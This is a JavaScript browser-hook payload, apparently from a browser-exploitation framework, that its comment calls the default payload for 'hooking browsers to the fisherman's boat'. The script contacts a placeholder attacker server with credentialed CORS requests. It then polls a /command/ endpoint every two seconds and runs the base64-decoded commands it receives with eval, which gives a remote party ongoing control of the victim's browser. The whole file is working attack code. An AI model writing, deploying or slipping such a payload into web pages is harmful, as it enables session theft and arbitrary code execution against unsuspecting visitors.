/*
Default payload for hooking browsers to the fisherman's boat using fetch api
This payload if for non-persistent scripts that after eval'd can be thrown away
*/


(async function() {
    var server = "<server>";
    var protocol = "<protocol>";
    var connectionRetryCount = 0;

    async function sleep(time) {
        return new Promise((resolve) => setTimeout(resolve, time));
    }

    async function startSession() {
        for (let nConnectionAttemps = 0; nConnectionAttemps < 4; nConnectionAttemps++) {
            console.log("Hooking to server... ");
            try {
                const res = await fetch(`${protocol}://${server}/hook/`, {
                    method: "GET",
                    mode: 'cors',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    credentials: "include"
                });

                if (!res.ok) {
                    throw new Error(`HTTP error! status: ${res.status}`);
                }

                return true;
    
            } 
            catch (error) {
                console.error(`Error hooking to server: ${error}, number of connection attempts: ${nConnectionAttemps}... `);
            }

            await sleep(2000);
        }
        
        return false;
    }

    async function sendRequest() {
        console.log("Fetching command from server...");
        try {
            const res = await fetch(`${protocol}://${server}/command/`, {
                method: "GET",
                mode: 'cors', 
                headers: {
                    'Content-Type': 'application/json'
                },
                credentials: "include"
            });

            if (!res.ok) {
                throw new Error(`HTTP error! status: ${res.status}`);
            }

            let data = await res.json();
            if (!data.command) {
                console.log("No command to execute... ");
            }

            else {
                eval(atob(data.command));
            }

            return true;

        } catch (error) {
            connectionRetryCount++;
            console.error(`Error fetching command from server: ${error}, number of connection attempts: ${connectionRetryCount}... `);
            if (connectionRetryCount > 3) {
                return false;
            }

            return true;
        }
    }

    const sessionStartStatus = await startSession();

    if (!sessionStartStatus) {
        throw new Error("Stopping execution due to connection problems... ");
    }

    const intervalId = setInterval(() => { 
        const status = sendRequest();
        if (!status) {
            clearInterval(intervalId);
            throw new Error("Stopping execution due to connection problems... ");
        }

    }, 2000);
})();